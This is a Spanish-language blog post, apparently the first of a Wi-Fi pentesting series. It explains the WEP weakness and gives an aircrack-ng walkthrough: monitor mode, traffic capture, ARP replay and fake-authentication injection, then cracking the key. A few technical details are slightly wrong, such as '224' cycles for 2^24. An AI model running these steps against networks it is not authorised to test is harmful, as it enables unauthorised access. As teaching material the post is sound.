---
layout: post
title: "Wi-Fi Pentesting #1- WEP"
date: 2020-10-20 1:29:00 -0400
categories: [security]
---

En esta serie de post se abordan comandos usados en pruebas de penetración de redes Wi-Fi, esta publicación consiste en una recopilación de instrucciones para su estudio, y posibles soluciones a estas vulnerabilidades, no se busca fomentar el uso indebido de estas técnicas.

Algoritmo WEP
---
WEP (Wired Equivalent Privacy) es un algoritmo de seguridad incluido en la norma IEEE 802.11.

Vulnerabilidad:
WEP utiliza RC4, un sistema de cifrado de flujos, y un IV (Initiation Vector) de pequeño tamaño, el cual es reciclado cada 224 ciclos, a continuación un esquema de su funcionamiento.

<p align="center">
  <img src="{{site.baseurl}}/assets/img/posts/wifi-pentesting/wep.svg?raw=true">
</p>


Debido a su funcionamiento la probabilidad de que se reutilicen 4 IVs idénticos cada 5000 paquetes es de 50%, lo cual es una vulnerabilidad explotable.

Esto puede conseguirse usando la herramienta aircrack-ng.
```
apt-get install aircrack-ng
```

Identificar la terjeta de red a utilizar, esto puede hacerse con ifconfig o iwconfig

```
iwconfig
```

el resultado será parecido a lo siguiente:
```
lo        no wireless extensions.

eno1      no wireless extensions.

wlp2s0    IEEE 802.11  ESSID:"PUNTODEACCESO"
          Mode:Managed  Frequency:2.462 GHz  Access Point: E8:DE:27:61:XX:XX
          Bit Rate=240 Mb/s   Tx-Power=22 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=43/70  Signal level=-67 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:6  Invalid misc:7697   Missed beacon:0
```


Debemos colocar la tarjeta de red seleccionada en modo monitor, (no todas las tarjetas admiten este modo, depende de sus caracteristicas físicas).
```
airmon-ng start [interfaz]
```

Identificar la red a "atacar", esto va a escuchar por la tarjeta wlp2s0
```
airodump-ng [interfaz]
```

Una vez que hemos identificado la red, escuchamos especificamente en esa red y capturamos el trafico.
```
airodump-ng -c [canal d ela red] -w [nombre de la captura] --bssid [MAC ADDRESS del AP] [interfaz]
```

Ahora tenemos que esperar que se envien suficientes paquetes Beacon para explotar la vulnerabilidad presente en WEP. En este paso puede acelerarse el proceso de varias formas, haciendo una falsa autenticación o haciendo un arpreplay, en cualquier caso el objetivo es crear mas paquetes para romper la clave en menos tiempo.
Metodo 1 (arpreplay)
```
aireplay-ng --arpreplay -h [DIRECCION MAC DE CLIENTE] -b [MAC DEL AP] [interfaz]
```
Metodo 2 (Fake authentication)
```
aireplay-ng -1 6000 -o 1 -q 10 -e [SSID] -a [BSSID] -h [MAC_ATACANTE] wlan0mon
```
Ejemplo:  
```
aireplay-ng -1 6000 -o 1 -q 10 -e PUNTODEACCESO -a 00:27:19:EE:C5:64 -h 00:1C:DF:C6:D4:FA wlan0mon
```

Donde
    6000 - Reauthenticate very 6000 seconds. The long period also causes keep alive packets to be sent.
    -o 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.
    -q 10 - Send keep alive packets every 10 seconds.


Una vez que tengamos un numero suficientemente alto de paquetes Beacon (al menos superior a 5000) probamos a romper la clave.
```
 # aircrack-ng -b [MAC DEL AP] [Nombre de la captura].cap
```

ESSID: Significa Extended Service Set ID y es el nombre identificable de la red  
BSSID: Significa Basic Service Set Identifier y se trata de la dirección MAC (física) del Access Point al que nos conectamos  
Beacon frame: is one of the management frames in IEEE 802.11 based WLANs. It contains all the information about the network. Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN and to synchronise the members of the service set. Beacon frames are transmitted by the access point (AP) in an infrastructure basic service set (BSS)  
